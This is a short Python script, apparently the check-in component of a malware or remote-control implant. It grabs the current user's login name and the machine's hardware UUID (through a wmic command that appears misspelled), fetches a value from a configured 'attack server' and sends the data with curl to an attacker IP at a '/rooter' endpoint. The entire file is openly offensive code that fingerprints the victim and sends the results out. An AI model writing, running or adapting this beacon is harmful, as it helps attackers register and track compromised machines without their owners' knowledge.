import subprocess
from urllib.request import urlopen
from urllib import request, parse
import os
import config

log = os.getlogin()

# the domain will demonstate an IP address
with urlopen(config.attack_server_domain) as response:
    body = response.read().decode()

cur_mac_id = str(subprocess.check_output('wmic scproduct get uuid'), 'utf-8').split('\n')[1].strip()

subprocess.run(f"""
curl -H "Content-Type: application/x-www-form-urlencoded" -d "i={body}
&hw={cur_mac_id}" http://{config.attack_ip}/rooter
""", shell=True)